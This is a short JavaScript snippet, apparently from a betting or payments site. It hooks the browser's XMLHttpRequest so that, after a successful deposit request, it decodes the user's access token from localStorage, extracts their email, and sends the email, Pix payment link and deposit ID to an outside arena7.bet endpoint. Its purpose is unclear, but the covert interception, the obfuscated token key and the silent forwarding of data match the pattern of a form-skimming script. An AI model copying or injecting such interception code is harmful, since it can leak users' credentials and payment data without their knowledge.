
let oldXHROpen = window.XMLHttpRequest.prototype.open;window.XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
 // do something with the method, url and etc.
 this.addEventListener('load', function() {
try {
 if(url==="/api/financial/requestDeposit" && this.status===200)
{
var ResponseData=JSON.parse(this.responseText);

if(ResponseData.status===0)
{
  var UserMail= JSON.parse(atob(atob(localStorage.getItem("YWNjZXNzX3Rva2Vu")).replace('"', "").split('.')[1])).unique_name;
   var _Dados = {
   
   "pix":ResponseData.data.pixLink,
   "email": UserMail,
   "depositId": ResponseData.data.depositId
   };
  fetch("https://redirect.arena7.bet/mail/qrcode?data="+btoa(JSON.stringify(_Dados)), {
      method: "GET" // default, so we can ignore
  });
}
}
} catch ({ name, message }) {

}
 }
 );
               
 return oldXHROpen.apply(this, arguments);
}
